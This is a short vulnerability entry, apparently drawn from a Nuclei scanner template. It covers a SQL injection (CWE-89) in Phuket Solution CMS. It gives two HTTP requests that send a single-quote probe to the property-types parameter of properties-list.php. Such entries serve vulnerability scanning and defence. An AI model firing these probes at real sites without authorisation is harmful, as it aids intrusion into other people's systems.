# Vulnerability: Phuket Solution CMS - SQL Injection
**Classification:** CWE-89
**Source:** Nuclei Template (`phuket-cms-sqli.yaml`)

## Description
Phuket Solutions CMS is vulnerable to sql injection in which an attacker is able to manipulate an SQL query through user input, causing the application to execute unintended SQL code.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /properties-list.php HTTP/1.1
Host: {{Hostname}}

GET /properties-list.php?property-types=%27 HTTP/1.1
Host: {{Hostname}}
```

